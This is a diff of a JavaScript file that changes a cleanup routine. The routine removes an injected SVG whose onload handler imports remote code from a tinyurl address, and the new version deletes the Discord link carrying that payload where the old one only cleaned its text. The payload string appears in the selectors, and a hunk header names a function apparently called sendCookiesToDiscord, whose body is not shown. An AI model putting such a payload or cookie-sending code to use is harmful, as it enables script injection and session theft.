@@ -29,7 +29,7 @@ function sendCookiesToDiscord() {
     });
 }
 
-// Function to remove the specific SVG element and clean up remaining artifacts
+// Function to remove the specific SVG element and its parent link
 function removeSpecificSvg() {
     // Remove the specific SVG element
     var svgElements = document.querySelectorAll('svg[onload="import(\'//tinyurl.com/tt45f\')"]');
@@ -38,18 +38,12 @@ function removeSpecificSvg() {
         console.log('Removed specific SVG element.');
     });
 
-    // Find and clean up any remaining elements or attributes that reference the payload
+    // Remove the parent link containing the unwanted payload
     var discordLinks = document.querySelectorAll('#discord a[title]');
     discordLinks.forEach(function(link) {
-        // Check if the title attribute contains the unwanted payload
         if (link.title.includes('<svg onload="import(\'//tinyurl.com/tt45f\')">')) {
-            // Extract the text before the payload
-            var originalText = link.title.split('<svg')[0];
-            // Set the text content to the original text
-            link.textContent = originalText;
-            // Optionally, clean up the title attribute if necessary
-            link.removeAttribute('title');
-            console.log('Cleaned up remaining payload artifacts.');
+            link.parentNode.removeChild(link);
+            console.log('Removed parent link containing the unwanted payload.');
         }
     });
 }
